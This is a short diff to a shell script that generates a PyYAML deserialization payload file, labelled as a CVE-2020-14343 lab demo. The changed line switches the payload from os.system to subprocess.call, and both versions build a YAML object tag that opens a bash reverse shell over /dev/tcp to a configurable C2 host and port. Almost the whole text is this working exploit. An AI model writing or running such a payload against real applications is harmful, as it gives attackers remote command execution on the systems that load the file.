@@ -13,7 +13,7 @@ cat > "$(dirname "$0")/evil-profile.yaml" <<YAML
 # CVE-2020-14343 demo payload — PyYAML unsafe Loader deserialization
 # This YAML will execute a reverse shell when loaded with yaml.Loader.
 # Lab demo use only.
-$(printf '!!python/object/apply:os.%s\n- "bash -i >& /dev/tcp/%s/%s 0>&1"' "system" "$C2_HOST" "$C2_PORT")
+$(printf '!!python/object/apply:subprocess.%s\n- [bash, -c, "bash -i >& /dev/tcp/%s/%s 0>&1"]' "call" "$C2_HOST" "$C2_PORT")
 YAML
 
 echo "[*] evil-profile.yaml written (C2: ${C2_HOST}:${C2_PORT})"
